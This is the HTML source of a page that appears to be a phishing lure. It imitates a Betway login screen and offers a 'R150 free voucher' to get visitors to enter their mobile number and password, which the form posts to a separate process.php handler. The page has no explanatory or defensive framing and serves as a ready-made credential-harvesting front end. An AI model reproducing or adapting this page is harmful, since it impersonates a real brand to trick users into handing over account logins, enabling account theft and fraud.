<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Betway Free Voucher</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="background-image">
        <div class="login-container">
            <h2>Betway Login</h2>
            <p>Claim your R150 free voucher!</p>
            <form action="process.php" method="post">
                <div class="input-group">
                    <label for="mobile">Mobile Number</label>
                    <input type="text" id="mobile" name="mobile" placeholder="+27" required>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Password" required>
                </div>
                <a href="#" class="forgot-password">Forgot Password?</a>
                <p>Don't have an account yet? <a href="#" class="sign-up">Sign Up</a></p>
                <button type="submit">Login</button>
                <div class="biometric-login">
                    <img src="https://via.placeholder.com/20" alt="Fingerprint">
                    <span>Login using Biometrics</span>
                </div>
            </form>
        </div>
    </div>
</body>
</html>
